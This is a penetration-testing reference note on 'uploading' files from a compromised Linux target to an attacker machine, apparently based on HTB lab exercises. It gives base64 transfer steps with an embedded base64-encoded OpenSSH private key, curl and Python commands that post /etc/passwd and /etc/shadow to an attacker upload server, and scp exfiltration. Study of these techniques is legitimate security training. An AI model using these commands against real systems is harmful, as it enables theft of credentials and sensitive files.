---
id: Upload
aliases: []
tags:
  - Pentest/File-Transfer/Linux/Upload
---

# Upload

Upload (*acquire*) files from the target machine
(*e.g., for password cracking, analysis, exfiltration, etc.*)

> [!tip]
>
> The methods used for [[Download|download]] are also available

___

<!-- Base64 {{{-->
## Base64

It may be not possible to transfer files
if (*for example*) the remote host has firewall protection

<!-- Info - Base64 {{{-->
> [!info]- Base64
>
> [Base64](https://en.wikipedia.org/wiki/Base64)
> is a [binary-to-text encoding](https://en.wikipedia.org/wiki/Binary-to-text_encoding)
> that uses 64 printable characters to represent each 6-bit segment
> of a sequence of byte values
>
> Binary-to-text encodings enables transmitting binary data
> on a communication channel that only supports text
<!-- }}} -->

1. **TARGET**: [md5sum](https://en.wikipedia.org/wiki/Md5sum)
   — Run on the file for reference

```sh
md5sum <file>
```

<!-- Example {{{-->
> [!example]-
>
> ```
> md5sum id_rsa
> ```
> ```sh
> 321de1d7e7c3735838890a72c9ae7d1d id_rsa
> ```
<!-- }}} -->

2. **TARGET**: Encode the binary file to base64

```sh
base64 <file> -w 0
```

```sh
cat <file> | base64 -w 0; echo
```

<!-- Info {{{-->
> [!info]-
>
> - `-w`, `--wrap=COLS`: Wrap encoded lines after COLS character (*default 76*)
>   (*0 to disable line wrapping*)
<!-- }}} -->

3. **ATTACKER**: Copy the base64 string to the terminal to decode it

```sh
echo <base64_string> | base64 -d > <file>
```

<!-- Example {{{-->
> [!example]-
>
> ```powershell
> PS C:\htb> [IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo="))
> ```
<!-- }}} -->

4. **ATTACKER**: [md5sum](https://en.wikipedia.org/wiki/Md5sum)
   — Validate the hash

```sh
md5sum <file>
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> md5sum id_rsa
> ```
> ```sh
> 321de1d7e7c3735838890a72c9ae7d1d id_rsa
> ```
<!-- }}} -->

___
<!-- }}} -->

<!-- Web Upload {{{-->
## Web Upload

1. **ATTACKER**: Install [uploadserver](https://github.com/Densaugeo/uploadserver)
   — Python's [http.server](https://docs.python.org/3/library/http.server.html)
   extended to include a file upload page

- [[pipx]]

```sh
pipx install uploadserver
```

- [[Virtual Environment]]

```sh
pip install uploadserver
```

2. **ATTACKER**: Create a Self-Signed Certificate


```sh
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
```

<!-- Warning {{{-->
> [!warning]
>
> The self-signed certificate file (*`server.pem`*)
> should not be placed in an accessible location
>
> > [!tip]
> >
> > It is recommend creating a new directory
> > outside the server's served files
> > to host the file for the web server
> >
> > ```sh
> > mkdir certificate && mv server.pem certificate/
> > ```
<!-- }}} -->

3. **ATTACKER**: Start the web server

Create a directory for the server (*optional*)

```sh
mkdir https && cd https
```

- [[pipx]]

```sh
pipx run uploadserver 443 --server-certificate ../certificate/server.pem
```

- [[Virtual Environment]]

```sh
python3 -m uploadserver 443 --server-certificate ../certificate/server.pem
```

4. **TARGET**: Upload multiple files

- [Python](https://www.python.org/downloads/)

```sh
python3 -c 'import requests;requests.post("<target>",files={"files":open("<file>","rb")})'
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'
> ```
<!-- }}} -->

- [[cURL]]

```sh
curl -X POST https://<target>/upload -F 'files=@<file>' -F 'files=@<file>' --insecure
```

<!-- Info {{{-->
> [!info]-
>
> The `/upload` path is a default URL endpoint
> provided by the Python `uploadserver` package for file uploads.
>
> - `--insecure`: Trust self-signed certificate
<!-- }}} -->

<!-- Example {{{-->
> [!example]-
>
> ```sh
> curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
> ```
<!-- }}} -->

<!-- Alternative Methods {{{-->
### Alternative Methods

Host alternative web servers on the target machine

[Python3](https://www.python.org/)
— Create a web server

```sh
python3 -m http.server
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> python3 -m http.server
> ```
> ```sh
> Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
> ```
<!-- }}} -->

[Python 2.7](https://www.python.org/download/releases/2.7/)
— Create a web server

```sh
python2.7 -m SimpleHTTPServer
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> python2.7 -m SimpleHTTPServer
> ```
> ```sh
> Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
> ```
<!-- }}} -->

[PHP](https://www.php.net/)
— Create a web server

```sh
php -S 0.0.0.0:8000
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> php -S 0.0.0.0:8000
> ```
> ```sh
> [Fri May 20 08:16:47 2022] PHP 7.4.28 Development Server (http://0.0.0.0:8000) started
> ```
<!-- }}} -->

[Ruby](https://www.ruby-lang.org/en/)
— Create a web server

```sh
ruby -run -ehttpd . -p8000
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> ruby -run -ehttpd . -p8000
> ```
> ```sh
> [2022-05-23 09:35:46] INFO  WEBrick 1.6.1
> [2022-05-23 09:35:46] INFO  ruby 2.7.4 (2021-07-07) [x86_64-linux-gnu]
> [2022-05-23 09:35:46] INFO  WEBrick::HTTPServer#start: pid=1705 port=8000
> ```
<!-- }}} -->

Download a file from the target onto the attacker machine

```sh
wget <target>:8000/<file>
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> wget 192.168.49.128:8000/filetotransfer.txt
> ```
> ```sh
> --2022-05-20 08:13:05--  http://192.168.49.128:8000/filetotransfer.txt
> Connecting to 192.168.49.128:8000... connected.
> HTTP request sent, awaiting response... 200 OK
> Length: 0 [text/plain]
> Saving to: 'filetotransfer.txt'
>
> filetotransfer.txt                       [ <=>                                                                  ]       0  --.-KB/s    in 0s      
>
> 2022-05-20 08:13:05 (0.00 B/s) - ‘filetotransfer.txt’ saved [0/0]
> ```
<!-- }}} -->

<!-- }}} -->

___
<!-- }}} -->

<!-- SSH {{{-->
## SSH

The [[SSH/General|SSH]] implementation comes with an
[SCP](https://en.wikipedia.org/wiki/Secure_copy_protocol)
utility for remote file transfer

It is possible to transfer files using `scp` once

- SSH connection is established
- User credentials are known

<!-- SCP Transfer {{{-->
### SCP Transfer

Transfer a file to the remote (*attacker*) machine

```sh
scp <file> <user>@<target>:/tmp/<file>
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> scp /etc/passwd user@10.129.86.90:/home/htb-student/
>
> user@10.129.86.90's password:
> passwd
> ```
<!-- }}} -->

> [!tip]
>
> Create a temporary user account for file transfers
> to avoid using primary credentials or keys on a remote computer

<!-- }}} -->

___
<!-- }}} -->
